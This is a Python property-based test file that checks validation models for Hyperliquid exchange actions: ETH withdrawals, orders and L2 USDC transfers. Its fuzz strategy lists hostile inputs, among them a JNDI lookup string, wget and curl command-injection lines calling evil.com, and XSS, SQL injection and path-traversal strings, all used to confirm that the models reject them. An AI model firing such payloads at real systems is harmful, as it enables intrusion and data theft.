"""Property-based tests for Hyperliquid raw exchange action models.

These tests validate critical security boundary models that process external exchange action data.
The models tested here are essential for order placement, transfers, and exchange operations.

SECURITY CRITICAL: These raw models protect against:
- Malicious order placement data that could manipulate trading decisions
- Financial precision errors in order prices and sizes
- Buffer overflow attacks through oversized order lists
- Injection attacks through malformed client order IDs
- ETH address manipulation that could redirect withdrawals
- Transfer amount manipulation that could affect balances
- Order type confusion that could change execution behavior

Property testing ensures coverage of exchange action edge cases and adversarial inputs.
"""

from __future__ import annotations

import string
from decimal import Decimal
from typing import Any, cast

import pytest
from hypothesis import assume, given, strategies as st
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.exceptions.field_validation import TypeFieldError
from cyberdelta.apis.hyperliquid.models.hl_raw_exchange_actions import (
    HyperliquidRawEthWithdrawalActionPayload,
    HyperliquidRawL2UsdTransferActionDetails,
    HyperliquidRawOrderItemSpec,
)
from cyberdelta.apis.hyperliquid.models.hl_raw_transfer_withdrawal import (
    HyperliquidRawL2UsdTransferPayload,
)
from cyberdelta.exceptions.parsing import EmptyStringError


# Type alias for malicious input types to avoid long lines
MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None


# =============================================================================
# HYPOTHESIS STRATEGIES FOR EXCHANGE ACTION MODEL TESTING
# =============================================================================


def eth_address_strategy() -> SearchStrategy[str]:
    """Generate valid Ethereum address strings.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        # Standard Ethereum addresses
        st.just("0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B"),
        st.just("0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb1"),
        st.just("0x0000000000000000000000000000000000000000"),  # Zero address
        st.just("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"),  # Max address
        # Generate random valid addresses
        st.text(
            alphabet=string.hexdigits,
            min_size=40,
            max_size=40,
        ).map(lambda x: f"0x{x}"),
    ])


def decimal_str_strategy() -> SearchStrategy[str]:
    """Generate valid decimal strings for prices and amounts.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
        st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
        st.just("0"),  # Zero
        st.just("0.01"),  # Small amount
        st.just("1.0"),  # Unit amount
        st.just("100.0"),  # Standard amount
        st.just("1234.56"),  # Common format
        st.just("50000.123456"),  # High-precision
        st.just("0.00000001"),  # Minimum precision
        # Scientific notation (valid for decimal parsing)
        st.just("1e2"),
        st.just("1.5e3"),
        st.just("2.5e-4"),
        # Negative prices (may be valid for some order types)
        st.just("-1.0"),
        st.just("-100.5"),
    ])


def positive_decimal_str_strategy() -> SearchStrategy[str]:
    """Generate valid positive decimal strings.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
        st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
        st.just("0.01"),
        st.just("1.0"),
        st.just("100.0"),
        st.just("1234.56"),
        st.just("50000.123456"),
    ])


def client_order_id_strategy() -> SearchStrategy[str | None]:
    """Generate valid client order ID strings (128-bit hex).

    Returns:
        SearchStrategy[str | None]: Strategy for generating test data.
    """
    return st.one_of([
        st.none(),  # Optional field
        # Valid 128-bit hex strings (34 chars total: 0x + 32 hex chars)
        st.text(
            alphabet=string.hexdigits,
            min_size=32,
            max_size=32,
        ).map(lambda x: f"0x{x}"),
        # Common patterns
        st.just("0x" + "0" * 32),  # All zeros
        st.just("0x" + "f" * 32),  # All f's
        st.just("0x" + "0" * 30 + "01"),  # Sequential ID
    ])


def order_type_details_strategy() -> SearchStrategy[dict[str, Any]]:
    """Generate valid order type details.

    Returns:
        SearchStrategy[dict[str, Any]]: Strategy for generating test data.
    """
    return st.one_of([
        # Limit orders with different TIF values
        st.just({"limit": {"tif": "Gtc"}}),
        st.just({"limit": {"tif": "Ioc"}}),
        st.just({"limit": {"tif": "Alo"}}),
        # Market orders
        st.just({"market": {}}),
    ])


@st.composite
def valid_order_item_spec_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid order item spec data.

    Returns:
        dict[str, Any]: Generated test data.
    """
    return {
        "asset_index": draw(st.integers(min_value=0, max_value=1000)),
        "is_buy": draw(st.booleans()),
        "limit_px": draw(decimal_str_strategy()),
        "size": draw(positive_decimal_str_strategy()),
        "reduce_only": draw(st.booleans()),
        "order_type_details": draw(order_type_details_strategy()),
        "client_order_id": draw(client_order_id_strategy()),
    }


@st.composite
def valid_eth_withdrawal_data(draw: st.DrawFn) -> dict[str, str]:
    """Generate valid ETH withdrawal data.

    Returns:
        dict[str, str]: Generated test data.
    """
    return {
        "amount": draw(positive_decimal_str_strategy()),
        "destination": draw(eth_address_strategy()),
    }


@st.composite
def valid_l2_transfer_payload_data(draw: st.DrawFn) -> dict[str, str]:
    """Generate valid L2 USD transfer payload data.

    Returns:
        dict[str, str]: Generated test data.
    """
    return {
        "destination": draw(eth_address_strategy()),
        "token": "USDC",  # Must be USDC for L2 transfers
        "amount": draw(positive_decimal_str_strategy()),
    }


def malicious_action_strategy() -> SearchStrategy[MaliciousInput]:
    """Generate malicious values for exchange action security testing.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        # Action manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-orders}"),
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('action-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE orders;--"),
        st.just("1' UNION SELECT * FROM wallets--"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just("A" * 1500),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.orders.find(); //"),
        # JSON injection
        st.just('{"$where": "this.amount > 1000000"}'),
        # Invalid decimals
        st.just("NaN"),
        st.just("inf"),
        st.just("-inf"),
        st.just("Infinity"),
        st.just("not_a_number"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
    ])


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW ETH WITHDRAWAL ACTION MODEL
# =============================================================================


class TestHyperliquidRawEthWithdrawalActionPayloadProperties:
    """Property-based tests for ETH withdrawal action payload validation and security."""

    @given(withdrawal_data=valid_eth_withdrawal_data())
    def test_eth_withdrawal_validation_success_properties(
        self, withdrawal_data: dict[str, str]
    ) -> None:
        """Property: Valid data should create valid payload objects."""
        # Skip invalid data
        for field in ["amount", "destination"]:
            value = withdrawal_data[field]
            assume(isinstance(value, str) and value.strip())
            if field == "amount":
                try:
                    decimal_val = Decimal(value.strip())
                    assume(decimal_val.is_finite() and decimal_val > 0)
                except (ValueError, TypeError):
                    assume(False)
            elif field == "destination":
                # Check valid ETH address format
                assume(value.startswith("0x") and len(value) == 42)
                assume(all(c in string.hexdigits for c in value[2:]))

        obj = HyperliquidRawEthWithdrawalActionPayload.model_validate(withdrawal_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawEthWithdrawalActionPayload)

        # Property: Amount should be preserved
        assert obj.amount == withdrawal_data["amount"]

        # Property: Destination should be normalized to lowercase
        assert obj.destination == withdrawal_data["destination"].lower()

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from(["amount", "destination"]),
        malicious_value=malicious_action_strategy(),
    )
    def test_eth_withdrawal_security_boundary_properties(
        self, field_name: str, malicious_value: MaliciousInput
    ) -> None:
        """Property: ETH withdrawal should reject malicious inputs."""
        base_data: dict[str, object] = {
            "amount": "100.0",
            "destination": "0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawEthWithdrawalActionPayload.model_validate(base_data)

    @given(
        invalid_address=st.one_of([
            st.just("0x123"),  # Too short
            st.just("Ab5801a7D398351b8bE11C439e05C5B3259aeC9B"),  # Missing 0x
            st.just("0xAb5801a7D398351b8bE11C439e05C5B3259aeC9X"),  # Invalid hex char
            st.just("0x" + "G" * 40),  # Non-hex characters
            st.text(min_size=43, max_size=100),  # Too long
            st.just(""),  # Empty
            st.just("   "),  # Whitespace
        ])
    )
    def test_eth_withdrawal_invalid_address_properties(self, invalid_address: str) -> None:
        """Property: ETH withdrawal should validate address format strictly."""
        withdrawal_data = {
            "amount": "100.0",
            "destination": invalid_address,
        }

        # Property: Invalid addresses should be rejected
        with pytest.raises((ValidationError, EmptyStringError, TypeFieldError)):
            HyperliquidRawEthWithdrawalActionPayload.model_validate(withdrawal_data)

    @given(
        invalid_amount=st.one_of([
            st.just(""),  # Empty
            st.just("   "),  # Whitespace
            st.just("NaN"),  # Not a number
            st.just("inf"),  # Infinity
            st.just("-inf"),  # Negative infinity
            st.just("Infinity"),
            st.just("not_a_number"),
            st.just("-100.0"),  # Negative (may be invalid for withdrawals)
        ])
    )
    def test_eth_withdrawal_invalid_amount_properties(self, invalid_amount: str) -> None:
        """Property: ETH withdrawal should validate amount constraints."""
        withdrawal_data = {
            "amount": invalid_amount,
            "destination": "0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B",
        }

        try:
            # Check if the amount can be parsed as a finite decimal
            decimal_val = Decimal(invalid_amount.strip() if invalid_amount else "")
            is_finite = decimal_val.is_finite()
            is_empty = not invalid_amount.strip()

            if is_finite and not is_empty:
                # Finite decimals may be accepted (including negative)
                obj = HyperliquidRawEthWithdrawalActionPayload.model_validate(withdrawal_data)
                assert obj.amount == invalid_amount
            else:
                # Non-finite or empty values should be rejected
                with pytest.raises((ValidationError, EmptyStringError, TypeFieldError)):
                    HyperliquidRawEthWithdrawalActionPayload.model_validate(withdrawal_data)

        except (ValueError, TypeError):
            # Unparseable strings should be rejected
            with pytest.raises((ValidationError, EmptyStringError, TypeFieldError)):
                HyperliquidRawEthWithdrawalActionPayload.model_validate(withdrawal_data)

    @given(
        extra_fields=st.dictionaries(
            st.text(min_size=1, max_size=20),
            st.text(min_size=1, max_size=20),
            min_size=1,
            max_size=5,
        )
    )
    def test_eth_withdrawal_extra_fields_properties(self, extra_fields: dict[str, str]) -> None:
        """Property: ETH withdrawal should forbid extra fields."""
        withdrawal_data = {
            "amount": "100.0",
            "destination": "0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B",
        }
        withdrawal_data.update(extra_fields)

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawEthWithdrawalActionPayload.model_validate(withdrawal_data)


# --- HyperliquidRawEthWithdrawalActionPayload Tests ---


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW ORDER ITEM SPEC MODEL
# =============================================================================


class TestHyperliquidRawOrderItemSpecProperties:
    """Property-based tests for order item specification validation and security."""

    @given(order_data=valid_order_item_spec_data())
    def test_order_item_validation_success_properties(self, order_data: dict[str, Any]) -> None:
        """Property: Valid data should create valid order spec objects."""
        # Skip invalid data
        assume(isinstance(order_data["asset_index"], int) and order_data["asset_index"] >= 0)
        assume(isinstance(order_data["is_buy"], bool))
        assume(isinstance(order_data["reduce_only"], bool))

        # Validate price and size
        for field in ["limit_px", "size"]:
            value = order_data[field]
            assume(isinstance(value, str) and value.strip())
            try:
                decimal_val = Decimal(value.strip())
                assume(decimal_val.is_finite())
                if field == "size":
                    assume(decimal_val >= 0)  # Size should be non-negative
            except (ValueError, TypeError):
                assume(False)

        # Validate order type
        order_type = order_data["order_type_details"]
        assume(isinstance(order_type, dict))
        assume("limit" in order_type or "market" in order_type)

        obj = HyperliquidRawOrderItemSpec.model_validate(order_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawOrderItemSpec)

        # Property: Fields should be mapped correctly to aliases
        assert obj.a == order_data["asset_index"]
        assert obj.b == order_data["is_buy"]
        assert obj.p == order_data["limit_px"]
        assert obj.s == str(Decimal(order_data["size"]).normalize())  # Normalized decimal
        assert obj.r == order_data["reduce_only"]

        # Property: Order type should be properly deserialized
        if "limit" in order_data["order_type_details"]:
            assert obj.t.limit is not None
        elif "market" in order_data["order_type_details"]:
            assert obj.t.market is not None

        # Property: Client order ID should be preserved if provided
        if order_data.get("client_order_id"):
            assert obj.c == order_data["client_order_id"]
        else:
            assert obj.c is None

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from(["asset_index", "is_buy", "limit_px", "size", "reduce_only"]),
        malicious_value=malicious_action_strategy(),
    )
    def test_order_item_security_boundary_properties(
        self, field_name: str, malicious_value: MaliciousInput
    ) -> None:
        """Property: Order item spec should reject malicious inputs."""
        base_data: dict[str, object] = {
            "asset_index": 0,
            "is_buy": True,
            "limit_px": "100.0",
            "size": "1.0",
            "reduce_only": False,
            "order_type_details": {"limit": {"tif": "Gtc"}},
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawOrderItemSpec.model_validate(base_data)

    @given(
        invalid_cloid=st.one_of([
            st.just(""),  # Empty
            st.just("not_hex"),  # Not hex
            st.just("0x"),  # Too short
            st.just("0x" + "a" * 33),  # Too long (33 hex chars)
            st.just("0x" + "G" * 32),  # Invalid hex chars
            st.text(min_size=35, max_size=100),  # Way too long
        ])
    )
    def test_order_item_invalid_client_order_id_properties(self, invalid_cloid: str) -> None:
        """Property: Order item spec should validate client order ID format."""
        order_data = {
            "asset_index": 0,
            "is_buy": True,
            "limit_px": "100.0",
            "size": "1.0",
            "reduce_only": False,
            "order_type_details": {"limit": {"tif": "Gtc"}},
            "client_order_id": invalid_cloid,
        }

        # Property: Invalid client order IDs should be rejected
        with pytest.raises((ValidationError, TypeFieldError)):
            HyperliquidRawOrderItemSpec.model_validate(order_data)

    @given(asset_index=st.integers(min_value=-1000, max_value=-1))
    def test_order_item_negative_asset_index_properties(self, asset_index: int) -> None:
        """Property: Order item spec should reject negative asset indices."""
        order_data = {
            "asset_index": asset_index,
            "is_buy": True,
            "limit_px": "100.0",
            "size": "1.0",
            "reduce_only": False,
            "order_type_details": {"limit": {"tif": "Gtc"}},
        }

        # Property: Negative asset indices should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawOrderItemSpec.model_validate(order_data)

    @given(invalid_tif=st.text().filter(lambda x: x not in {"Gtc", "Ioc", "Alo"}))
    def test_order_item_invalid_tif_properties(self, invalid_tif: str) -> None:
        """Property: Order item spec should validate TIF values."""
        assume(invalid_tif.strip())  # Skip empty strings

        order_data = {
            "asset_index": 0,
            "is_buy": True,
            "limit_px": "100.0",
            "size": "1.0",
            "reduce_only": False,
            "order_type_details": {"limit": {"tif": invalid_tif}},
        }

        # Property: Invalid TIF values should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawOrderItemSpec.model_validate(order_data)

    @given(orders_data=st.lists(valid_order_item_spec_data(), min_size=0, max_size=100))
    def test_batch_order_list_properties(self, orders_data: list[dict[str, Any]]) -> None:
        """Property: Multiple order items should validate independently."""
        valid_orders = []

        for order_data in orders_data:
            try:
                # Validate each order can be created
                assume(
                    isinstance(order_data["asset_index"], int) and order_data["asset_index"] >= 0
                )
                assume(isinstance(order_data["is_buy"], bool))
                assume(isinstance(order_data["reduce_only"], bool))

                # Validate decimals
                for field in ["limit_px", "size"]:
                    value = order_data[field]
                    assume(isinstance(value, str) and value.strip())
                    decimal_val = Decimal(value.strip())
                    assume(decimal_val.is_finite())
                    if field == "size":
                        assume(decimal_val >= 0)

                obj = HyperliquidRawOrderItemSpec.model_validate(order_data)
                valid_orders.append(obj)
            except (ValueError, TypeError, ValidationError):
                pass  # Skip invalid orders

        # Property: All valid orders should be properly typed
        for obj in valid_orders:
            assert isinstance(obj, HyperliquidRawOrderItemSpec)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW L2 USD TRANSFER ACTION MODEL
# =============================================================================


class TestHyperliquidRawL2UsdTransferActionDetailsProperties:
    """Property-based tests for L2 USD transfer action details validation and security."""

    @given(payload_data=valid_l2_transfer_payload_data())
    def test_l2_transfer_validation_success_properties(self, payload_data: dict[str, str]) -> None:
        """Property: Valid data should create valid action details objects."""
        # Skip invalid data
        for field in ["destination", "amount"]:
            value = payload_data[field]
            assume(isinstance(value, str) and value.strip())
            if field == "amount":
                try:
                    decimal_val = Decimal(value.strip())
                    assume(decimal_val.is_finite() and decimal_val > 0)
                except (ValueError, TypeError):
                    assume(False)
            elif field == "destination":
                # Check valid ETH address format
                assume(value.startswith("0x") and len(value) == 42)
                assume(all(c in string.hexdigits for c in value[2:]))

        # Token must be USDC
        assume(payload_data["token"] == "USDC")

        data = {"chain": "L2", "payload": payload_data}
        obj = HyperliquidRawL2UsdTransferActionDetails.model_validate(data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawL2UsdTransferActionDetails)
        assert obj.chain == "L2"

        # Property: Payload should be properly typed
        assert isinstance(obj.payload, HyperliquidRawL2UsdTransferPayload)
        assert obj.payload.destination == payload_data["destination"].lower()
        assert obj.payload.token == "USDC"
        assert obj.payload.amount == payload_data["amount"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(invalid_chain=st.text().filter(lambda x: x != "L2"))
    def test_l2_transfer_invalid_chain_properties(self, invalid_chain: str) -> None:
        """Property: L2 transfer should only accept 'L2' as chain value."""
        assume(invalid_chain.strip())  # Skip empty strings

        payload_data = {
            "destination": "0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B",
            "token": "USDC",
            "amount": "100.0",
        }
        data = {"chain": invalid_chain, "payload": payload_data}

        # Property: Non-L2 chain values should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawL2UsdTransferActionDetails.model_validate(data)

    @given(invalid_token=st.text().filter(lambda x: x != "USDC"))
    def test_l2_transfer_invalid_token_properties(self, invalid_token: str) -> None:
        """Property: L2 transfer should only accept 'USDC' as token value."""
        assume(invalid_token.strip())  # Skip empty strings

        payload_data = {
            "destination": "0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B",
            "token": invalid_token,
            "amount": "100.0",
        }
        data = {"chain": "L2", "payload": payload_data}

        # Property: Non-USDC token values should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawL2UsdTransferActionDetails.model_validate(data)

    @given(malicious_payload=malicious_action_strategy())
    def test_l2_transfer_malicious_payload_properties(
        self, malicious_payload: MaliciousInput
    ) -> None:
        """Property: L2 transfer should reject malicious payload data."""
        data = {"chain": "L2", "payload": malicious_payload}

        # Property: Malicious payloads should be rejected
        with pytest.raises((ValidationError, TypeError, TypeFieldError)):
            HyperliquidRawL2UsdTransferActionDetails.model_validate(data)


# --- HyperliquidRawBatchPlaceOrderActionPayload Tests (Model removed - skipping) ---
"""


def test_batch_place_order_payload_valid() -> None:
    Test batch place order payload valid.
    order_item_data = {
        "asset_index": 0,
        "is_buy": True,
        "limit_px": VALID_DECIMAL_STR,
        "size": "1.0",
        "reduce_only": False,
        "order_type_details": VALID_LIMIT_ORDER_TYPE_DETAILS_GTC,
    }
    data = {
        "type": "order",
        "grouping": "na",
        "orders": [order_item_data],
    }
    payload = HyperliquidRawBatchPlaceOrderActionPayload.model_validate(data)
    assert payload.type == "order"
    assert payload.grouping == "na"
    assert len(payload.orders) == 1
    assert isinstance(payload.orders[0], HyperliquidRawOrderItemSpec)
    assert payload.model_config.get("extra") == "forbid"
    assert payload.model_config.get("frozen") is True


@pytest.mark.parametrize(
    "field_path, value, expected_error_part",
    [
        # Test invalid type for asset_index
        (("orders", 0, "asset_index"), "not-an-int", "Must be an integer"),
        # Test invalid type for is_buy
        (("orders", 0, "is_buy"), "not-a-bool", "Must be a boolean"),
        # Test invalid format for limit_px (not a string)
        (("orders", 0, "limit_px"), 123.45, "Expected string, got float"),
        # FIXME: limitPx uses RawFiniteDecimalStr, which allows negative values.
        # This test expects non-negative, which is incorrect for this raw type.
        # (
        #     ("orders", 0, "limit_px"),
        #     INVALID_DECIMAL_STR_NEGATIVE,
        #     "must be non-negative",
        # ),
        # Test invalid format for sz (not parseable to decimal)
        (("orders", 0, "size"), "not-a-decimal", "Cannot convert 'not-a-decimal' to Decimal"),
        # FIXME: sz uses RawFiniteDecimalStr, which allows negative values.
        # This test expects non-negative, which is incorrect for this raw type.
        # (
        #     ("orders", 0, "size"),
        #     INVALID_DECIMAL_STR_NEGATIVE,
        #     "must be non-negative",
        # ),
        # Test invalid type for reduce_only
        (("orders", 0, "reduce_only"), "not-a-bool", "Must be a boolean"),
        # Removed test for invalid order type structure - raw models no longer validate
        # business logic
        # Test invalid tif value within limit order_type
        (
            ("orders", 0, "order_type_details", "limit", "tif"),
            "InvalidTif",
            "Invalid value 'InvalidTif'. Expected one of",
        ),
    ],
)
def test_batch_place_order_payload_invalid_fields(
    field_path: tuple[str | int, ...],
    value: object,
    expected_error_part: str,
) -> None:
    Test batch place order payload invalid fields.
    # Base valid data structure for a batch order item
    # Note: The model HyperliquidRawOrderItemSpec expects `order_type_details`
    # (alias for field `t`) as the JSON key for order type information.
    base_order_item_data: dict[str, Any] = {
        "asset_index": 0,  # Using alias directly for test data setup simplicity
        "is_buy": True,
        "limit_px": VALID_DECIMAL_STR,
        "size": "1.0",
        "reduce_only": False,
        "order_type_details": VALID_LIMIT_ORDER_TYPE_DETAILS_GTC,  # Correct alias for field 't'
    }

    base_batch_data: dict[str, Any] = {
        "type": "order",
        "grouping": "na",
        "orders": [base_order_item_data.copy()],  # Start with one valid order
    }

    # Apply the invalid value at the specified path
    modified_batch_data = base_batch_data.copy()
    # Ensure orders list exists and has an item if path targets it
    if field_path[0] == "orders" and isinstance(field_path[1], int):
        while len(modified_batch_data["orders"]) <= field_path[1]:
            modified_batch_data["orders"].append(base_order_item_data.copy())

    set_nested_value(modified_batch_data, field_path, value)

    with pytest.raises(ValidationError) as exc_info:
        HyperliquidRawBatchPlaceOrderActionPayload.model_validate(modified_batch_data)

    assert any(
        expected_error_part.lower() in err_detail["msg"].lower()
        for err_detail in exc_info.value.errors()
    )


def test_batch_place_order_payload_orders_empty_list_valid() -> None:
    Test batch place order payload orders empty list valid.
    data: dict[str, str | list[dict[str, Any]]] = {"type": "order", "grouping": "na", "orders": []}
    payload = HyperliquidRawBatchPlaceOrderActionPayload.model_validate(data)
    assert payload.orders == []


def test_batch_place_order_payload_extra_field() -> None:
    Test batch place order payload extra field.
    data: dict[str, str | list[dict[str, Any]] | Any] = {
        "type": "order",
        "grouping": "na",
        "orders": [],
        "extra_field": "value",
    }
    with pytest.raises(ValidationError, match="Extra inputs are not permitted"):
        HyperliquidRawBatchPlaceOrderActionPayload.model_validate(data)
"""  # End of commented out batch tests

# --- HyperliquidRawL2UsdTransferActionDetails Tests (New) ---


def test_l2_usd_transfer_action_details_valid() -> None:
    """Test l2 usd transfer action details valid."""
    payload_data = {
        "destination": "0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B",
        "token": "USDC",
        "amount": "100.0",
    }
    data = {"chain": "L2", "payload": payload_data}
    action_details = HyperliquidRawL2UsdTransferActionDetails.model_validate(data)
    assert action_details.chain == "L2"
    assert isinstance(action_details.payload, HyperliquidRawL2UsdTransferPayload)
    assert (
        action_details.payload.destination == "0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B".lower()
    )
    assert action_details.payload.token == "USDC"
    assert action_details.payload.amount == "100.0"
    assert action_details.model_config.get("extra") == "forbid"
    assert action_details.model_config.get("frozen") is True


@pytest.mark.parametrize(
    ("field", "value", "expected_error_part"),
    [
        ("chain", "L1", "Input should be 'L2'"),
        ("chain", None, "Field required"),
        ("payload", None, "Field required"),
        (
            "payload",
            {
                "destination": "0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B",
                "token": "DAI",
                "amount": "1",
            },
            "Input should be 'USDC'",
        ),
    ],
)
def test_l2_usd_transfer_action_details_invalid(
    field: str,
    value: object,
    expected_error_part: str,
) -> None:
    """Test l2 usd transfer action details invalid."""
    base_payload_data = {
        "destination": "0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B",
        "token": "USDC",
        "amount": "10.5",
    }
    base_data: dict[str, Any] = {"chain": "L2", "payload": base_payload_data}

    if value is None and field in base_data:
        del base_data[field]
    else:
        base_data[field] = cast("Any", value)  # Cast for test compatibility

    with pytest.raises(ValidationError) as exc_info:
        HyperliquidRawL2UsdTransferActionDetails.model_validate(base_data)
    assert any(
        expected_error_part.lower() in err_detail["msg"].lower()
        for err_detail in exc_info.value.errors()
    )


def test_HyperliquidRawEthWithdrawalActionPayload_extra_field() -> None:
    """Test validation fails with extra fields."""
    data = {
        "amount": "100.0",
        "destination": "0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B",
        "extra": "field",
    }
    with pytest.raises(ValidationError):
        HyperliquidRawEthWithdrawalActionPayload.model_validate(data)


def test_HyperliquidRawOrderItemSpec_extra_field() -> None:
    """Test validation fails with extra fields."""
    data = {
        "asset_index": 0,
        "is_buy": True,
        "limit_px": "100.0",
        "size": "1.0",
        "reduce_only": False,
        "order_type_details": {"limit": {"tif": "Gtc"}},
        "extra_field": "value",
    }
    with pytest.raises(ValidationError):
        HyperliquidRawOrderItemSpec.model_validate(data)


def test_HyperliquidRawL2UsdTransferActionDetails_extra_field() -> None:
    """Test validation fails with extra fields."""
    data: dict[str, str | dict[str, Any] | Any] = {
        "chain": "L2",
        "payload": {
            "destination": "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb1",
            "token": "USDC",
            "amount": "100.0",
        },
        "extra": "field",
    }
    with pytest.raises(ValidationError):
        HyperliquidRawL2UsdTransferActionDetails.model_validate(data)


# --- HyperliquidRawCancelOrderAction Tests (Model renamed - skipping) ---
# --- HyperliquidRawBatchPlaceOrderActionPayload Tests (Model removed - skipping) ---
